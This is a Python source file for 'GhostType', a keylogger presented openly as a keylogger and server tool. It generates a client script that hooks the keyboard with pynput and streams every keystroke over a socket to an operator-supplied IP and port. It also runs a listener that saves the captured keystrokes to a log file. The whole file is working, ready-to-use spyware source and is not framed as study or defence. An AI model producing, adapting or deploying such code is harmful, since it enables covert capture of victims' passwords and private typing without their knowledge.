import socket
import re

# Function to display startup banner
def show_banner():
    banner = r"""
                                                    
                                                       
 @@@@@@@@  @@@  @@@   @@@@@@@@   @@@@@@@  @@@@@@@      
@@@@@@@@@  @@@  @@@  @@@@@@@@@@  @@@@@@@  @@@@@@@      
!@@        @@!  @@@  @@!   @@@@  !@@        @@!        
!@!        !@!  @!@  !@!  @!@!@  !@!        !@!        
!@! @!@!@  @!@!@!@!  @!@ @! !@!  !!@@!!     @!!        
!!! !!@!!  !!!@!!!!  !@!!!  !!!  @!!@!!!    !!!        
:!!   !!:  !!:  !!!  !!:!   !!!      !:!    !!:        
:!:   !::  :!:  !:!  :!:    !:!      !:!    :!:        
 ::: ::::  ::   :::  ::::::: ::  :::: ::     ::        
 :: :: :    :   : :   : : :  :   :: : :      :         
                                                       
                                                       
                  @@@@@@@  @@@ @@@  @@@@@@@   @@@@@@   
                  @@@@@@@  @@@ @@@  @@@@@@@@  @@@@@@@  
                    @@!    @@! !@@  @@!  @@@      @@@  
                    !@!    !@! @!!  !@!  @!@      @!@  
                    @!!     !@!@!   @!@@!@!   @!@!!@   
                    !!!      @!!!   !!@!!!    !!@!@!   
                    !!:      !!:    !!:           !!:  
                    :!:      :!:    :!:           :!:  
                     ::       ::     ::       :: ::::  
                     :        :      :         : : :   
                                                                
                                                     
             GhostType - Keylogger & Server Management Tool
             Created by: UdayPali
    """
    print(banner)

# Function to generate the keylogger client script
def generate_keylogger(lhost, lport):
    keylogger_script = f"""
import socket
from pynput import keyboard

# Set up a socket connection to the server
server_ip = '{lhost}'
server_port = {lport}

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client_socket.connect((server_ip, server_port))
except socket.error as e:
    print(f"Connection error: {{e}}")
    client_socket.close()

def on_press(key):
    try:
        if key.char:
            data = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            data = ' '
        elif key == keyboard.Key.enter:
            data = '\\n'
        elif key == keyboard.Key.backspace:
            data = '[BACKSPACE]'
        elif key == keyboard.Key.shift:
            data = '[SHIFT]'
        else:
            data = f'[str(key)]'

    # Send data to the remote server
    client_socket.send(data.encode('utf-8'))

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
    client_socket.close()
    """
    
    # Save the generated script to a file
    with open('remote_keylogger.py', 'w') as f:
        f.write(keylogger_script)
    print("Remote keylogger script has been generated as 'remote_keylogger.py'.")

# Function to start the server
def start_server(lhost, lport):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((lhost, lport))
        server_socket.listen(5)

        print(f"Server started on {lhost}:{lport}. Waiting for connections...")

        client_socket, addr = server_socket.accept()
        
        print(f"Connection from {addr}")
        print('Keylogs are being recorded and generated....')

        with open('remote_keylog.txt', 'a') as log_file:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                # Write received keystrokes to file
                log_file.write(data.decode('utf-8'))
        
        client_socket.close()
        server_socket.close()
    except socket.error as e:
        print(f"Socket error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Function to validate IP and port input
def validate_ip(ip):
    ip_pattern = re.compile(r'^\d{1,3}(\.\d{1,3}){3}$')
    return ip_pattern.match(ip) is not None

def validate_port(port):
    return 1 <= port <= 65535

# Main menu function
def main_menu():
    while True:
        print("\nMain Menu:")
        print("1) Create keylogger")
        print("2) Start Server")
        print("3) Exit")
        choice = input("Enter your choice (1/2/3): ").strip()

        if choice == '1':
            lhost = input("Enter the LHOST (your machine's IP): ")
            if not validate_ip(lhost):
                print("Invalid IP address. Please try again.")
                continue
            try:
                lport = int(input("Enter the LPORT (port for server): "))
                if not validate_port(lport):
                    raise ValueError("Port out of range")
            except ValueError as e:
                print(f"Error: {e}")
                continue
            generate_keylogger(lhost, lport)
        elif choice == '2':
            lhost = input("Enter the LHOST (your machine's IP): ")
            if not validate_ip(lhost):
                print("Invalid IP address. Please try again.")
                continue
            try:
                lport = int(input("Enter the LPORT (port for server): "))
                if not validate_port(lport):
                    raise ValueError("Port out of range")
            except ValueError as e:
                print(f"Error: {e}")
                continue
            start_server(lhost, lport)
        elif choice == '3':
            print("Exiting program.")
            break
        else:
            print("Invalid choice. Please try again.")

# Run the main program
if __name__ == '__main__':
    show_banner()
    main_menu()